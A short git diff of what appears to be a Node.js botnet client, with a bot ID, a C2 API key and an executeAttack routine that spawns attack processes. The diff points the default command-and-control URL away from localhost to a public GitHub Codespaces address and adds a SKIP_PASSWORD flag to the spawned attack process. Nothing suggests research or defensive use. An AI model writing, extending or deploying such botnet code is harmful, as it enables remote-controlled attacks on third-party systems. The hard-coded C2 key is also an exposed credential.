@@ -17,7 +17,7 @@ import { spawn } from 'child_process';
 // ============================================
 // CONFIGURATION
 // ============================================
-const C2_URL = process.argv[2] || 'http://localhost:8080';
+const C2_URL = process.argv[2] || 'https://super-duper-waddle-4jwqw567q4x925jj6-8080.app.github.dev';
 const API_KEY = 'aryzz-c2-api-key-2024';
 const BOT_ID = crypto.randomUUID();
 const RECONNECT_INTERVAL = 5000;
@@ -114,7 +114,8 @@ async function executeAttack(task) {
             '--rpc', rpc.toString()
         ], {
             cwd: process.cwd(),
-            stdio: 'pipe'
+            stdio: 'pipe',
+            env: { ...process.env, SKIP_PASSWORD: 'true' }
         });
 
         activeAttacks.set(id, attackProcess);
